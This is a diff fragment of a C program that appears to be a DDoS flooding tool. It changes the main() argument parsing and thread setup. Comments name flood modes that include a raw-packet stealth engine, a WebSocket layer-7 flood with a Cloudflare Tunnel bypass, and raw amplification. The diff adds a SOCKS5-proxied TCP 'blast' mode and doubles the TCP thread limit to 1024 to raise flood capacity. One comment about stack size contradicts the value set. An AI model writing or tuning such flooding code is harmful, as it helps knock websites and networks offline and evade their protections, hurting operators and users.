@@ -120,6 +120,7 @@ int main(int argc, char *argv[]) {
     if (strstr(args.mode, "stealth")) { args.is_stealth = 1; args.is_v18_tcp = 1; args.is_v17_tcp_bypass = 1; } // AF_PACKET raw engine
     if (strstr(args.mode, "v20_ws")) { args.is_v20_ws = 1; } // WebSocket L7 flood (CF Tunnel bypass)
     if (strstr(args.mode, "v19_tcp")) { args.is_v19_tcp = 1; args.is_v15_raw_amp = 1; }
+    if (strcmp(args.mode, "vn") == 0) { args.is_vn_tcp = 1; } // VN: SOCKS5 proxy TCP blast via epoll
     if (strcmp(args.mode, "raw_hybrid_v15") == 0) args.is_hybrid_v15 = 1;
     if (strstr(args.mode, "xdp_filter")) args.is_xdp_filter = 1;
 
@@ -191,7 +192,7 @@ int main(int argc, char *argv[]) {
     }
     // V18 TLS TCP connection mode: limit threads
     if (args.is_v18_tls) {
-        int max_tcp_threads = 512;
+        int max_tcp_threads = 1024;
         if (args.threads > max_tcp_threads) {
             LOG_INFO("TCP mode: threads %d -> %d (each manages %d conns for total %d)",
                      args.threads, max_tcp_threads, args.rate / max_tcp_threads, args.rate);
@@ -202,7 +203,7 @@ int main(int argc, char *argv[]) {
     // Set 512KB stack per thread (default 8MB × 1500 = 12GB = crash)
     pthread_attr_t attr;
     pthread_attr_init(&attr);
-    pthread_attr_setstacksize(&attr, 2 * 1024 * 1024);
+    pthread_attr_setstacksize(&attr, 2 * 1024 * 1024);  // 2MB stack (1024 threads x 2MB = 2GB)
     
     for (int i = 0; i < args.threads && i < MAX_THREADS; i++) {
         int *t = malloc(sizeof(int)); *t = i;
